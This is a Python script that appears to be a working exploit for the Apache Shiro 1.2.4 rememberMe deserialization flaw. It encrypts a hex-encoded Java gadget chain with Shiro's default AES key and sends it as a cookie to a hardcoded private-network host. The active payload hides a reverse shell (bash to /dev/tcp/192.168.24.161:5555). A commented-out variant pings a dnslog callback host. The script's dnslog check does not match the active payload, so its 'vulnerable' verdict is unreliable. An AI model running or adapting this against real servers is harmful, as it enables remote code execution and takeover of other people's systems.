#!/usr/bin/env python
# coding:utf-8

import time
import base64
import uuid
import requests
import random
import binascii
from Crypto.Cipher import AES


def poc(url):
	if '://' not in url:
		target = 'https://%s' % url if ':443' in url else 'http://%s' % url
	else:
		target = url
	try:
		numint = random.randint(1000, 9999)
		payload = generator(numint)
		requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)
		time.sleep(3)
		resp = requests.get("http://admin.dnslog.link/api/dns/test/test/")
		if "%s.shiro" % (str(numint)) in resp.content:
			print "[+] %s is vulnerable." % (url)
			return True
	except:
		pass
	return False


def generator(numint):
	# payload = "ACED0005 73720017 6A617661 2E757469 6C2E5072 696F7269 74795175 65756594 DA30B4FB 3F82B103 00024900 0473697A 654C000A 636F6D70 61726174 6F727400 164C6A61 76612F75 74696C2F 436F6D70 61726174 6F723B78 70000000 02737200 426F7267 2E617061 6368652E 636F6D6D 6F6E732E 636F6C6C 65637469 6F6E7334 2E636F6D 70617261 746F7273 2E547261 6E73666F 726D696E 67436F6D 70617261 746F722F F984F02B B108CC02 00024C00 09646563 6F726174 65647100 7E00014C 000B7472 616E7366 6F726D65 7274002D 4C6F7267 2F617061 6368652F 636F6D6D 6F6E732F 636F6C6C 65637469 6F6E7334 2F547261 6E73666F 726D6572 3B787073 7200406F 72672E61 70616368 652E636F 6D6D6F6E 732E636F 6C6C6563 74696F6E 73342E63 6F6D7061 7261746F 72732E43 6F6D7061 7261626C 65436F6D 70617261 746F72FB F49925B8 6EB13702 00007870 7372003B 6F72672E 61706163 68652E63 6F6D6D6F 6E732E63 6F6C6C65 6374696F 6E73342E 66756E63 746F7273 2E496E76 6F6B6572 5472616E 73666F72 6D657287 E8FF6B7B 7CCE3802 00035B00 05694172 67737400 135B4C6A 6176612F 6C616E67 2F4F626A 6563743B 4C000B69 4D657468 6F644E61 6D657400 124C6A61 76612F6C 616E672F 53747269 6E673B5B 000B6950 6172616D 54797065 73740012 5B4C6A61 76612F6C 616E672F 436C6173 733B7870 75720013 5B4C6A61 76612E6C 616E672E 4F626A65 63743B90 CE589F10 73296C02 00007870 00000000 74000E6E 65775472 616E7366 6F726D65 72757200 125B4C6A 6176612E 6C616E67 2E436C61 73733BAB 16D7AECB CD5A9902 00007870 00000000 77040000 00037372 003A636F 6D2E7375 6E2E6F72 672E6170 61636865 2E78616C 616E2E69 6E746572 6E616C2E 78736C74 632E7472 61782E54 656D706C 61746573 496D706C 09574FC1 6EACAB33 03000949 000D5F69 6E64656E 744E756D 62657249 000E5F74 72616E73 6C657449 6E646578 5A00155F 75736553 65727669 6365734D 65636861 6E69736D 4C00195F 61636365 73734578 7465726E 616C5374 796C6573 68656574 71007E00 0A4C000B 5F617578 436C6173 73657374 003B4C63 6F6D2F73 756E2F6F 72672F61 70616368 652F7861 6C616E2F 696E7465 726E616C 2F78736C 74632F72 756E7469 6D652F48 61736874 61626C65 3B5B000A 5F627974 65636F64 65737400 035B5B42 5B00065F 636C6173 7371007E 000B4C00 055F6E61 6D657100 7E000A4C 00115F6F 75747075 7450726F 70657274 69657374 00164C6A 6176612F 7574696C 2F50726F 70657274 6965733B 78700000 0000FFFF FFFF0074 0003616C 6C707572 00035B5B 424BFD19 156767DB 37020000 78700000 00027572 00025B42 ACF317F8 060854E0 02000078 70000006 A2CAFEBA BE000000 3100380A 00030022 07003607 00250700 26010010 73657269 616C5665 7273696F 6E554944 0100014A 01000D43 6F6E7374 616E7456 616C7565 05AD2093 F391DDEF 3E010006 3C696E69 743E0100 03282956 01000443 6F646501 000F4C69 6E654E75 6D626572 5461626C 65010012 4C6F6361 6C566172 6961626C 65546162 6C650100 04746869 73010013 53747562 5472616E 736C6574 5061796C 6F616401 000C496E 6E657243 6C617373 65730100 354C7973 6F736572 69616C2F 7061796C 6F616473 2F757469 6C2F4761 64676574 73245374 75625472 616E736C 65745061 796C6F61 643B0100 09747261 6E73666F 726D0100 72284C63 6F6D2F73 756E2F6F 72672F61 70616368 652F7861 6C616E2F 696E7465 726E616C 2F78736C 74632F44 4F4D3B5B 4C636F6D 2F73756E 2F6F7267 2F617061 6368652F 786D6C2F 696E7465 726E616C 2F736572 69616C69 7A65722F 53657269 616C697A 6174696F 6E48616E 646C6572 3B295601 0008646F 63756D65 6E740100 2D4C636F 6D2F7375 6E2F6F72 672F6170 61636865 2F78616C 616E2F69 6E746572 6E616C2F 78736C74 632F444F 4D3B0100 0868616E 646C6572 73010042 5B4C636F 6D2F7375 6E2F6F72 672F6170 61636865 2F786D6C 2F696E74 65726E61 6C2F7365 7269616C 697A6572 2F536572 69616C69 7A617469 6F6E4861 6E646C65 723B0100 0A457863 65707469 6F6E7307 00270100 A6284C63 6F6D2F73 756E2F6F 72672F61 70616368 652F7861 6C616E2F 696E7465 726E616C 2F78736C 74632F44 4F4D3B4C 636F6D2F 73756E2F 6F72672F 61706163 68652F78 6D6C2F69 6E746572 6E616C2F 64746D2F 44544D41 78697349 74657261 746F723B 4C636F6D 2F73756E 2F6F7267 2F617061 6368652F 786D6C2F 696E7465 726E616C 2F736572 69616C69 7A65722F 53657269 616C697A 6174696F 6E48616E 646C6572 3B295601 00086974 65726174 6F720100 354C636F 6D2F7375 6E2F6F72 672F6170 61636865 2F786D6C 2F696E74 65726E61 6C2F6474 6D2F4454 4D417869 73497465 7261746F 723B0100 0768616E 646C6572 0100414C 636F6D2F 73756E2F 6F72672F 61706163 68652F78 6D6C2F69 6E746572 6E616C2F 73657269 616C697A 65722F53 65726961 6C697A61 74696F6E 48616E64 6C65723B 01000A53 6F757263 6546696C 6501000C 47616467 6574732E 6A617661 0C000A00 0B070028 01003379 736F7365 7269616C 2F706179 6C6F6164 732F7574 696C2F47 61646765 74732453 74756254 72616E73 6C657450 61796C6F 61640100 40636F6D 2F73756E 2F6F7267 2F617061 6368652F 78616C61 6E2F696E 7465726E 616C2F78 736C7463 2F72756E 74696D65 2F416273 74726163 74547261 6E736C65 74010014 6A617661 2F696F2F 53657269 616C697A 61626C65 01003963 6F6D2F73 756E2F6F 72672F61 70616368 652F7861 6C616E2F 696E7465 726E616C 2F78736C 74632F54 72616E73 6C657445 78636570 74696F6E 01001F79 736F7365 7269616C 2F706179 6C6F6164 732F7574 696C2F47 61646765 74730100 083C636C 696E6974 3E010011 6A617661 2F6C616E 672F5275 6E74696D 6507002A 01000A67 65745275 6E74696D 65010015 28294C6A 6176612F 6C616E67 2F52756E 74696D65 3B0C002C 002D0A00 2B002E01 00257069 6E67202D 63203320 {numint} 2E736869 726F2E74 6573742E 646E736C 6F672E6C 696E6B08 00300100 04657865 63010027 284C6A61 76612F6C 616E672F 53747269 6E673B29 4C6A6176 612F6C61 6E672F50 726F6365 73733B0C 00320033 0A002B00 3401001E 79736F73 65726961 6C2F5077 6E657235 35303139 30393134 31373635 39390100 204C7973 6F736572 69616C2F 50776E65 72353530 31393039 31343137 36353939 3B002100 02000300 01000400 01001A00 05000600 01000700 00000200 08000400 01000A00 0B000100 0C000000 2F000100 01000000 052AB700 01B10000 0002000D 00000006 00010000 002E000E 0000000C 00010000 0005000F 00370000 00010013 00140002 000C0000 003F0000 00030000 0001B100 00000200 0D000000 06000100 00003300 0E000000 20000300 00000100 0F003700 00000000 01001500 16000100 00000100 17001800 02001900 00000400 01001A00 01001300 1B000200 0C000000 49000000 04000000 01B10000 0002000D 00000006 00010000 0037000E 0000002A 00040000 0001000F 00370000 00000001 00150016 00010000 0001001C 001D0002 00000001 001E001F 00030019 00000004 0001001A 00080029 000B0001 000C0000 001B0003 00020000 000FA700 03014CB8 002F1231 B6003557 B1000000 00000200 20000000 02002100 11000000 0A000100 02002300 10000975 71007E00 1A000001 D4CAFEBA BE000000 31001B0A 00030015 07001707 00180700 19010010 73657269 616C5665 7273696F 6E554944 0100014A 01000D43 6F6E7374 616E7456 616C7565 0571E669 EE3C6D47 18010006 3C696E69 743E0100 03282956 01000443 6F646501 000F4C69 6E654E75 6D626572 5461626C 65010012 4C6F6361 6C566172 6961626C 65546162 6C650100 04746869 73010003 466F6F01 000C496E 6E657243 6C617373 65730100 254C7973 6F736572 69616C2F 7061796C 6F616473 2F757469 6C2F4761 64676574 7324466F 6F3B0100 0A536F75 72636546 696C6501 000C4761 64676574 732E6A61 76610C00 0A000B07 001A0100 2379736F 73657269 616C2F70 61796C6F 6164732F 7574696C 2F476164 67657473 24466F6F 0100106A 6176612F 6C616E67 2F4F626A 65637401 00146A61 76612F69 6F2F5365 7269616C 697A6162 6C650100 1F79736F 73657269 616C2F70 61796C6F 6164732F 7574696C 2F476164 67657473 00210002 00030001 00040001 001A0005 00060001 00070000 00020008 00010001 000A000B 0001000C 0000002F 00010001 00000005 2AB70001 B1000000 02000D00 00000600 01000000 3B000E00 00000C00 01000000 05000F00 12000000 02001300 00000200 14001100 00000A00 01000200 16001000 09707400 0450776E 72707701 00787372 00116A61 76612E6C 616E672E 496E7465 67657212 E2A0A4F7 81873802 00014900 0576616C 75657872 00106A61 76612E6C 616E672E 4E756D62 657286AC 951D0B94 E08B0200 00787000 00000178".format(numint=binascii.b2a_hex(str(numint))).replace(' ', '').decode('hex')
	payload = '''aced 0005 7372 0017 6a61 7661 2e75 7469 6c2e 5072 696f 7269 7479 5175 6575 6594 da30 b4fb 3f82 b103 0002 4900 0473 697a 654c 000a 636f 6d70 6172 6174 6f72 7400 164c 6a61 7661 2f75 7469 6c2f 436f 6d70 6172 6174 6f72 3b78 7000 0000 0273 7200 426f 7267 2e61 7061 6368 652e 636f 6d6d 6f6e 732e 636f 6c6c 6563 7469 6f6e 7334 2e63 6f6d 7061 7261 746f 7273 2e54 7261 6e73 666f 726d 696e 6743 6f6d 7061 7261 746f 722f f984 f02b b108 cc02 0002 4c00 0964 6563 6f72 6174 6564 7100 7e00 014c 000b 7472 616e 7366 6f72 6d65 7274 002d 4c6f 7267 2f61 7061 6368 652f 636f 6d6d 6f6e 732f 636f 6c6c 6563 7469 6f6e 7334 2f54 7261 6e73 666f 726d 6572 3b78 7073 7200 406f 7267 2e61 7061 6368 652e 636f 6d6d 6f6e 732e 636f 6c6c 6563 7469 6f6e 7334 2e63 6f6d 7061 7261 746f 7273 2e43 6f6d 7061 7261 626c 6543 6f6d 7061 7261 746f 72fb f499 25b8 6eb1 3702 0000 7870 7372 003b 6f72 672e 6170 6163 6865 2e63 6f6d 6d6f 6e73 2e63 6f6c 6c65 6374 696f 6e73 342e 6675 6e63 746f 7273 2e49 6e76 6f6b 6572 5472 616e 7366 6f72 6d65 7287 e8ff 6b7b 7cce 3802 0003 5b00 0569 4172 6773 7400 135b 4c6a 6176 612f 6c61 6e67 2f4f 626a 6563 743b 4c00 0b69 4d65 7468 6f64 4e61 6d65 7400 124c 6a61 7661 2f6c 616e 672f 5374 7269 6e67 3b5b 000b 6950 6172 616d 5479 7065 7374 0012 5b4c 6a61 7661 2f6c 616e 672f 436c 6173 733b 7870 7572 0013 5b4c 6a61 7661 2e6c 616e 672e 4f62 6a65 6374 3b90 ce58 9f10 7329 6c02 0000 7870 0000 0000 7400 0e6e 6577 5472 616e 7366 6f72 6d65 7275 7200 125b 4c6a 6176 612e 6c61 6e67 2e43 6c61 7373 3bab 16d7 aecb cd5a 9902 0000 7870 0000 0000 7704 0000 0003 7372 003a 636f 6d2e 7375 6e2e 6f72 672e 6170 6163 6865 2e78 616c 616e 2e69 6e74 6572 6e61 6c2e 7873 6c74 632e 7472 6178 2e54 656d 706c 6174 6573 496d 706c 0957 4fc1 6eac ab33 0300 0649 000d 5f69 6e64 656e 744e 756d 6265 7249 000e 5f74 7261 6e73 6c65 7449 6e64 6578 5b00 0a5f 6279 7465 636f 6465 7374 0003 5b5b 425b 0006 5f63 6c61 7373 7100 7e00 0b4c 0005 5f6e 616d 6571 007e 000a 4c00 115f 6f75 7470 7574 5072 6f70 6572 7469 6573 7400 164c 6a61 7661 2f75 7469 6c2f 5072 6f70 6572 7469 6573 3b78 7000 0000 00ff ffff ff75 7200 035b 5b42 4bfd 1915 6767 db37 0200 0078 7000 0000 0275 7200 025b 42ac f317 f806 0854 e002 0000 7870 0000 06bc cafe babe 0000 0032 0039 0a00 0300 2207 0037 0700 2507 0026 0100 1073 6572 6961 6c56 6572 7369 6f6e 5549 4401 0001 4a01 000d 436f 6e73 7461 6e74 5661 6c75 6505 ad20 93f3 91dd ef3e 0100 063c 696e 6974 3e01 0003 2829 5601 0004 436f 6465 0100 0f4c 696e 654e 756d 6265 7254 6162 6c65 0100 124c 6f63 616c 5661 7269 6162 6c65 5461 626c 6501 0004 7468 6973 0100 1353 7475 6254 7261 6e73 6c65 7450 6179 6c6f 6164 0100 0c49 6e6e 6572 436c 6173 7365 7301 0035 4c79 736f 7365 7269 616c 2f70 6179 6c6f 6164 732f 7574 696c 2f47 6164 6765 7473 2453 7475 6254 7261 6e73 6c65 7450 6179 6c6f 6164 3b01 0009 7472 616e 7366 6f72 6d01 0072 284c 636f 6d2f 7375 6e2f 6f72 672f 6170 6163 6865 2f78 616c 616e 2f69 6e74 6572 6e61 6c2f 7873 6c74 632f 444f 4d3b 5b4c 636f 6d2f 7375 6e2f 6f72 672f 6170 6163 6865 2f78 6d6c 2f69 6e74 6572 6e61 6c2f 7365 7269 616c 697a 6572 2f53 6572 6961 6c69 7a61 7469 6f6e 4861 6e64 6c65 723b 2956 0100 0864 6f63 756d 656e 7401 002d 4c63 6f6d 2f73 756e 2f6f 7267 2f61 7061 6368 652f 7861 6c61 6e2f 696e 7465 726e 616c 2f78 736c 7463 2f44 4f4d 3b01 0008 6861 6e64 6c65 7273 0100 425b 4c63 6f6d 2f73 756e 2f6f 7267 2f61 7061 6368 652f 786d 6c2f 696e 7465 726e 616c 2f73 6572 6961 6c69 7a65 722f 5365 7269 616c 697a 6174 696f 6e48 616e 646c 6572 3b01 000a 4578 6365 7074 696f 6e73 0700 2701 00a6 284c 636f 6d2f 7375 6e2f 6f72 672f 6170 6163 6865 2f78 616c 616e 2f69 6e74 6572 6e61 6c2f 7873 6c74 632f 444f 4d3b 4c63 6f6d 2f73 756e 2f6f 7267 2f61 7061 6368 652f 786d 6c2f 696e 7465 726e 616c 2f64 746d 2f44 544d 4178 6973 4974 6572 6174 6f72 3b4c 636f 6d2f 7375 6e2f 6f72 672f 6170 6163 6865 2f78 6d6c 2f69 6e74 6572 6e61 6c2f 7365 7269 616c 697a 6572 2f53 6572 6961 6c69 7a61 7469 6f6e 4861 6e64 6c65 723b 2956 0100 0869 7465 7261 746f 7201 0035 4c63 6f6d 2f73 756e 2f6f 7267 2f61 7061 6368 652f 786d 6c2f 696e 7465 726e 616c 2f64 746d 2f44 544d 4178 6973 4974 6572 6174 6f72 3b01 0007 6861 6e64 6c65 7201 0041 4c63 6f6d 2f73 756e 2f6f 7267 2f61 7061 6368 652f 786d 6c2f 696e 7465 726e 616c 2f73 6572 6961 6c69 7a65 722f 5365 7269 616c 697a 6174 696f 6e48 616e 646c 6572 3b01 000a 536f 7572 6365 4669 6c65 0100 0c47 6164 6765 7473 2e6a 6176 610c 000a 000b 0700 2801 0033 7973 6f73 6572 6961 6c2f 7061 796c 6f61 6473 2f75 7469 6c2f 4761 6467 6574 7324 5374 7562 5472 616e 736c 6574 5061 796c 6f61 6401 0040 636f 6d2f 7375 6e2f 6f72 672f 6170 6163 6865 2f78 616c 616e 2f69 6e74 6572 6e61 6c2f 7873 6c74 632f 7275 6e74 696d 652f 4162 7374 7261 6374 5472 616e 736c 6574 0100 146a 6176 612f 696f 2f53 6572 6961 6c69 7a61 626c 6501 0039 636f 6d2f 7375 6e2f 6f72 672f 6170 6163 6865 2f78 616c 616e 2f69 6e74 6572 6e61 6c2f 7873 6c74 632f 5472 616e 736c 6574 4578 6365 7074 696f 6e01 001f 7973 6f73 6572 6961 6c2f 7061 796c 6f61 6473 2f75 7469 6c2f 4761 6467 6574 7301 0008 3c63 6c69 6e69 743e 0100 116a 6176 612f 6c61 6e67 2f52 756e 7469 6d65 0700 2a01 000a 6765 7452 756e 7469 6d65 0100 1528 294c 6a61 7661 2f6c 616e 672f 5275 6e74 696d 653b 0c00 2c00 2d0a 002b 002e 0100 2c62 6173 6820 2d69 203e 2620 2f64 6576 2f74 6370 2f31 3932 2e31 3638 2e32 342e 3136 312f 3535 3535 2030 3e26 3108 0030 0100 0465 7865 6301 0027 284c 6a61 7661 2f6c 616e 672f 5374 7269 6e67 3b29 4c6a 6176 612f 6c61 6e67 2f50 726f 6365 7373 3b0c 0032 0033 0a00 2b00 3401 000d 5374 6163 6b4d 6170 5461 626c 6501 001b 7973 6f73 6572 6961 6c2f 5077 6e65 7233 3335 3430 3330 3832 3734 3401 001d 4c79 736f 7365 7269 616c 2f50 776e 6572 3333 3534 3033 3038 3237 3434 3b00 2100 0200 0300 0100 0400 0100 1a00 0500 0600 0100 0700 0000 0200 0800 0400 0100 0a00 0b00 0100 0c00 0000 2f00 0100 0100 0000 052a b700 01b1 0000 0002 000d 0000 0006 0001 0000 002e 000e 0000 000c 0001 0000 0005 000f 0038 0000 0001 0013 0014 0002 000c 0000 003f 0000 0003 0000 0001 b100 0000 0200 0d00 0000 0600 0100 0000 3300 0e00 0000 2000 0300 0000 0100 0f00 3800 0000 0000 0100 1500 1600 0100 0000 0100 1700 1800 0200 1900 0000 0400 0100 1a00 0100 1300 1b00 0200 0c00 0000 4900 0000 0400 0000 01b1 0000 0002 000d 0000 0006 0001 0000 0037 000e 0000 002a 0004 0000 0001 000f 0038 0000 0000 0001 0015 0016 0001 0000 0001 001c 001d 0002 0000 0001 001e 001f 0003 0019 0000 0004 0001 001a 0008 0029 000b 0001 000c 0000 0024 0003 0002 0000 000f a700 0301 4cb8 002f 1231 b600 3557 b100 0000 0100 3600 0000 0300 0103 0002 0020 0000 0002 0021 0011 0000 000a 0001 0002 0023 0010 0009 7571 007e 0018 0000 01d4 cafe babe 0000 0032 001b 0a00 0300 1507 0017 0700 1807 0019 0100 1073 6572 6961 6c56 6572 7369 6f6e 5549 4401 0001 4a01 000d 436f 6e73 7461 6e74 5661 6c75 6505 71e6 69ee 3c6d 4718 0100 063c 696e 6974 3e01 0003 2829 5601 0004 436f 6465 0100 0f4c 696e 654e 756d 6265 7254 6162 6c65 0100 124c 6f63 616c 5661 7269 6162 6c65 5461 626c 6501 0004 7468 6973 0100 0346 6f6f 0100 0c49 6e6e 6572 436c 6173 7365 7301 0025 4c79 736f 7365 7269 616c 2f70 6179 6c6f 6164 732f 7574 696c 2f47 6164 6765 7473 2446 6f6f 3b01 000a 536f 7572 6365 4669 6c65 0100 0c47 6164 6765 7473 2e6a 6176 610c 000a 000b 0700 1a01 0023 7973 6f73 6572 6961 6c2f 7061 796c 6f61 6473 2f75 7469 6c2f 4761 6467 6574 7324 466f 6f01 0010 6a61 7661 2f6c 616e 672f 4f62 6a65 6374 0100 146a 6176 612f 696f 2f53 6572 6961 6c69 7a61 626c 6501 001f 7973 6f73 6572 6961 6c2f 7061 796c 6f61 6473 2f75 7469 6c2f 4761 6467 6574 7300 2100 0200 0300 0100 0400 0100 1a00 0500 0600 0100 0700 0000 0200 0800 0100 0100 0a00 0b00 0100 0c00 0000 2f00 0100 0100 0000 052a b700 01b1 0000 0002 000d 0000 0006 0001 0000 003b 000e 0000 000c 0001 0000 0005 000f 0012 0000 0002 0013 0000 0002 0014 0011 0000 000a 0001 0002 0016 0010 0009 7074 0004 5077 6e72 7077 0100 7873 7200 116a 6176 612e 6c61 6e67 2e49 6e74 6567 6572 12e2 a0a4 f781 8738 0200 0149 0005 7661 6c75 6578 7200 106a 6176 612e 6c61 6e67 2e4e 756d 6265 7286 ac95 1d0b 94e0 8b02 0000 7870 0000 0001 78'''.replace(' ', '').decode('hex')
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode = AES.MODE_CBC
	iv = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	file_body = pad(payload)
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
	return base64_ciphertext

poc("http://192.168.10.216:8082/shiro-1.2.4-samples-web")
